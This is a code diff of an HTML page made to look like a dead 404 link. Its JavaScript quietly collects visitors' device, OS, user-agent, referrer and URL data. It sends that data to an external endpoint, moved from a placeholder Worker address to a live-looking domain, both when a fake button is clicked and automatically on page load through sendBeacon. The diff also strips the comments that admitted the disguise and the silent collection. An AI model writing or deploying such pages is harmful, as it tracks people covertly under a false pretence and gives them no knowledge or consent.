@@ -51,11 +51,6 @@
             border-color: #e74c3c;
             color: #e74c3c;
         }
-        /* 隐藏的真实抽奖按钮 - 防误触 */
-        .real-btn {
-            display: none;
-        }
-        /* 加载动画 */
         .loading {
             display: none;
             margin-top: 20px;
@@ -88,19 +83,15 @@
 
     <script>
         (function() {
-            // ========== 配置区 ==========
-            const WORKER_URL = 'https://your-worker.workers.dev'; // ⚠️ 改成你的Worker地址
-            const ACTIVITY_ID = 'summer2026'; // 活动标识，方便区分
-            // ============================
+            const WORKER_URL = 'https://fxyzapi.zft1145.top';
+            const ACTIVITY_ID = 'summer2026';
 
-            // 收集设备信息
             function getDeviceInfo() {
                 const ua = navigator.userAgent;
                 let os = 'Unknown';
                 let osVersion = 'Unknown';
                 let deviceType = 'Unknown';
 
-                // 检测 iOS
                 const iosMatch = ua.match(/iPhone OS (\d+)_(\d+)/);
                 if (iosMatch) {
                     os = 'iOS';
@@ -110,18 +101,14 @@
                     os = 'iOS';
                     osVersion = 'iPad';
                     deviceType = 'iPad';
-                } 
-                // 检测 Android
-                else if (ua.includes('Android')) {
+                } else if (ua.includes('Android')) {
                     os = 'Android';
                     const androidMatch = ua.match(/Android (\d+)\.(\d+)/);
                     if (androidMatch) {
                         osVersion = androidMatch[1] + '.' + androidMatch[2];
                     }
                     deviceType = 'Android';
-                } 
-                // 检测桌面
-                else if (ua.includes('Windows')) {
+                } else if (ua.includes('Windows')) {
                     os = 'Windows';
                     deviceType = 'PC';
                 } else if (ua.includes('Mac OS')) {
@@ -135,13 +122,12 @@
                 return { os, osVersion, deviceType, ua: ua.substring(0, 500) };
             }
 
-            // 发送数据到 Worker
             function sendData() {
                 const device = getDeviceInfo();
                 const data = {
                     activityId: ACTIVITY_ID,
                     timestamp: new Date().toISOString(),
-                    ip: '', // Worker端会获取真实IP
+                    ip: '',
                     userAgent: device.ua,
                     os: device.os,
                     osVersion: device.osVersion,
@@ -150,7 +136,6 @@
                     url: window.location.href
                 };
 
-                // 显示加载状态
                 const loading = document.getElementById('loading');
                 loading.classList.add('show');
 
@@ -162,10 +147,8 @@
                 .then(res => res.json())
                 .then(result => {
                     console.log('数据已记录:', result);
-                    // 假装跳转（实际不跳，保持404伪装）
                     setTimeout(() => {
                         loading.classList.remove('show');
-                        // 可以弹个假提示
                         document.querySelector('.msg').textContent = '链接已失效，请联系管理员';
                         document.querySelector('.msg').style.color = '#e74c3c';
                     }, 1200);
@@ -176,20 +159,15 @@
                 });
             }
 
-            // 用户点击"返回首页"触发收集
             document.getElementById('fakeBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 sendData();
             });
 
-            // 页面加载后自动收集（静默，不打扰用户）
             window.addEventListener('load', function() {
-                // 延迟1秒后自动上报（用户可能关闭页面，但数据已发）
                 setTimeout(() => {
-                    // 但为了防止重复，只上报一次
                     if (!window._reported) {
                         window._reported = true;
-                        // 使用sendBeacon保证页面关闭也能发送
                         const device = getDeviceInfo();
                         const data = {
                             activityId: ACTIVITY_ID,
@@ -201,12 +179,11 @@
                             deviceType: device.deviceType,
                             referer: document.referrer || '',
                             url: window.location.href,
-                            auto: true // 标记为自动上报
+                            auto: true
                         };
                         if (navigator.sendBeacon) {
                             navigator.sendBeacon(WORKER_URL, JSON.stringify(data));
                         } else {
-                            // fallback
                             fetch(WORKER_URL, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
